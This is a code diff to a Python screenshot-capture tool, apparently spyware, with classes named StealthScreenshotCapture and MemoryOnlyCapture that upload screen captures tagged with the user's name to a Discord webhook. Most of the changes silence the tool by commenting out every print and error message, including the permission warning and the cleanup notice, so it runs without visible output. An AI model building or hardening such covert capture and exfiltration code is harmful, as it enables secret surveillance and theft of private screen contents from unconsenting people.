@@ -47,7 +47,7 @@ class StealthScreenshotCapture:
         try:
             if os.path.exists(self.temp_dir):
                 shutil.rmtree(self.temp_dir)
-                print(f"Cleaned up temporary directory: {self.temp_dir}")
+                #print(f"Cleaned up temporary directory: {self.temp_dir}")
         except:
             pass
     
@@ -66,7 +66,7 @@ class StealthScreenshotCapture:
                 
                 return img
         except Exception as e:
-            print(f"Error capturing screenshot: {e}")
+            #print(f"Error capturing screenshot: {e}")
             return None
     
     def compress_image(self, image, max_size=1280, quality=75):
@@ -123,7 +123,7 @@ class StealthScreenshotCapture:
                
                 
         except Exception as e:
-            print(f"Error sending to Discord: {e}")
+            pass
         finally:
             if 'img_bytes' in locals():
                 img_bytes.close()
@@ -149,7 +149,7 @@ class StealthScreenshotCapture:
                     time.sleep(1)
                 
             except Exception as e:
-                print(f"Error in capture loop: {e}")
+                #print(f"Error in capture loop: {e}")
                 time.sleep(self.interval)
     
     def emergency_stop(self):
@@ -172,6 +172,7 @@ class StealthScreenshotCapture:
             self.cleanup()
 
 class MemoryOnlyCapture(StealthScreenshotCapture):
+    #print("MOC")
     """Even more stealthy - never writes to disk at all"""
     
     def send_to_discord(self, image):
@@ -192,6 +193,7 @@ class MemoryOnlyCapture(StealthScreenshotCapture):
                         img_bytes.getvalue(), 
                         'image/jpeg')
             }
+            #print("Sending screenshot...")
             
             data = {
                 'content': f'**Screenshot Capture - {UserName}  - {timestamp}**'
@@ -206,10 +208,10 @@ class MemoryOnlyCapture(StealthScreenshotCapture):
                 self.screenshot_count += 1
                 
             else:
-                print(f"Failed to send: {response.status_code}")
-                
+                pass
+
         except Exception as e:
-            print(f"Error sending to Discord: {e}")
+            pass
 
 def main():
     # Configuration - REPLACE WITH YOUR WEBHOOK URL
@@ -233,11 +235,12 @@ def main():
         try:
             capturer.start()
         except Exception as e:
-            print(f"Error: {e}")
+            pass
         finally:
-            print("\nAll traces have been cleaned up.")
+            pass 
+      
     else:
-        print("You must have permission to run this tool.")
+        #print("You must have permission to run this tool.")
         sys.exit(1)
 
 if __name__ == "__main__":
@@ -255,8 +258,8 @@ if __name__ == "__main__":
             missing_modules.append(module)
     
     if missing_modules:
-        print(f"Missing required modules: {', '.join(missing_modules)}")
-        print("Install with: pip install mss pillow requests keyboard")
+        #print(f"Missing required modules: {', '.join(missing_modules)}")
+        #print("Install with: pip install mss pillow requests keyboard")
         sys.exit(1)
     
     main()
